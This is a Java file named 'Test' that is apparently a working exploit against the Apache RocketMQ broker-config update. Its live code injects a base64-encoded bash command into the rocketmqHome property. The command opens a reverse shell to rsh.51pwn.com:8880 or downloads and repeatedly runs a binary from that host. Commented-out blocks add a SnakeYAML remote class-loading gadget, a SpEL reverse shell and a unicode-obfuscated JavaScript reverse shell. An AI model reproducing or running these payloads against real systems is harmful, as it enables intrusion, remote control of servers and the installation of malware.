package com;
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;


import java.io.IOException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

import static java.lang.System.out;

public class Test {
//    public static void TestYaml(){
//        Yaml yaml = new Yaml();
//        yaml.load("!!javax.script.ScriptEngineManager [\n
//                !!java.net.URLClassLoader [[
//        !!java.net.URL ["https://rsh.51pwn.com/yaml-rce.class"]
//  ]]
//]");
//    }
//    public static void TestXml(){
//        XStream xstream = new XStream();
//        xstream.fromXML(x);
//
//        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
//        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
//        Object o = xmlDecoder.readObject();
//        System.out.println(o);
//    }
    public static void main(String[] args) throws Exception {

        try {
            Properties properties = new Properties();
            properties.setProperty("filterServerNums","1");
            properties.setProperty("rocketmqHome","-c bash${IFS}-c${IFS}\"{echo,bmMgcnNoLjUxcHduLmNvbSA4ODgwIC1lIC9iaW4vc2ggfHwgJChYPS9ydnNfbGludXggQT1odHRwOi8vcnNoLjUxcHduLmNvbTo4ODgwOy4kWHx8cm0gLXJmIC4kWCYmY3VybCAtc0wgLW8gLiRYICRBIHx8IHdnZXQgLXEgLWMgLU8gLiRYICRBO2NobW9kICt4IC4kWDtscyAuJFggJiYgd2hpbGUgOjsgZG8gLiRYOyBkb25lKQ==}|{base64,-d}|{bash,-i}\";");
            DefaultMQAdminExt defaultMQAdminExt = new DefaultMQAdminExt();
            defaultMQAdminExt.setNamesrvAddr("192.168.1.101:9876");
            defaultMQAdminExt.start();
            defaultMQAdminExt.updateBrokerConfig("192.168.1.101:10911", properties);
            defaultMQAdminExt.shutdown();

        } catch (Exception e) {
            e.printStackTrace();
        }
//        new Rsh51pwn();
//        String expression = "#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"var x=new java.lang.ProcessBuilder();x.command(['bash', '-c', 'exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1','&']);x.start();\")";
//        SpelExpressionParser parser = new SpelExpressionParser();
//        Expression exp = parser.parseExpression(expression);
//        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
//        exp.getValue(context);
//
//        out.println("");
//        try {
////        new java.lang.ProcessBuilder("bash","-c","exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1","&").start();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        try {
//            new javax.script.ScriptEngineManager().
//                    getEngineByName("JavaScript").
//                    eval("\\u0076\\u0061\\u0072\\u0020\\u0078\\u003D\\u006E\\u0065\\u0077\\u0020\\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0050\\u0072\\u006F\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006C\\u0064\\u0065\\u0072\\u0028\\u0029\\u003B\\u0078\\u002E\\u0063\\u006F\\u006D\\u006D\\u0061\\u006E\\u0064\\u0028\\u005B\\u0022\\u0062\\u0061\\u0073\\u0068\\u0022\\u002C\\u0022\\u002D\\u0063\\u0022\\u002C\\u0022\\u0065\\u0078\\u0065\\u0063\\u0020\\u0062\\u0061\\u0073\\u0068\\u0020\\u002D\\u0069\\u0020\\u0026\\u003E\\u002F\\u0064\\u0065\\u0076\\u002F\\u0074\\u0063\\u0070\\u002F\\u0072\\u0073\\u0068\\u002E\\u0035\\u0031\\u0070\\u0077\\u006E\\u002E\\u0063\\u006F\\u006D\\u002F\\u0038\\u0038\\u0038\\u0030\\u0020\\u003C\\u0026\\u0031\\u0022\\u002C\\u0022\\u0026\\u0022\\u005D\\u0029\\u003B\\u0078\\u002E\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u002E\\u0067\\u0065\\u0074\\u0049\\u006E\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006D\\u0028\\u0029\\u003B");
//        } catch (Exception e) {
//        }
//        new javax.script.ScriptEngineManager().getEngineByName("JavaScript")
//                .eval("var x=new java.lang.ProcessBuilder(); x.command([\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\",\"&\"]);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())");

    }
}
